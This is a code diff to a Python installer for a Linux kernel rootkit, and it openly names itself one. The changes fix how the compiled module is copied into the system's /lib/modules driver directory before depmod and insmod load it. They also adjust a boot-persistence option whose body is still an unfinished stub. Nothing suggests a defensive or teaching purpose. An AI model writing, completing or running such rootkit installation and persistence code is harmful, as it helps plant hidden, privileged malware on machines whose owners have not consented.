@@ -116,14 +116,14 @@ def create_config_header_file(user_defines: dict, path: str):
 ####
 
 
-def enable_persistence(module_name):
+def enable_persistence():
 	pass
 	print_status("Making rootkit persistent...")
 	# TODO: This
 	print_success("Persistence established.")
 
 
-def remove_persistence(module_name):
+def remove_persistence():
 	# TODO: This
 	pass
 
@@ -175,11 +175,12 @@ def install(kernel_version):
 
 	# Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
 	print_status("Installing rootkit...")
-	module_dest_path = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
-	if not os.path.exists(module_dest_path):
-		os.mkdir(module_dest_path)
+	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
+	if not os.path.exists(module_dest_dir):
+		os.mkdir(module_dest_dir)
 
 	module_curr_path = "./rootkit/{}".format(config["MODULE_NAME"])
+	module_dest_path = module_dest_dir + "/" + config["MODULE_NAME"]
 
 	# Move the compiled kernel module to the kernel modules directories.
 	try:
@@ -191,11 +192,11 @@ def install(kernel_version):
 
 	# Load the kernel module
 	run_cmd("depmod")
-	run_cmd("insmod {}/{}".format(module_dest_path, config["MODULE_NAME"]))
+	run_cmd("insmod {}".format(module_dest_path))
 
 	# Option to enable persistence by making the module load on boot.
 	if prompt_yes_no("Enable persistence?"):
-		enable_persistence(config["MODULE_NAME"])
+		enable_persistence()
 
 	print_success("Successful installation.")
 
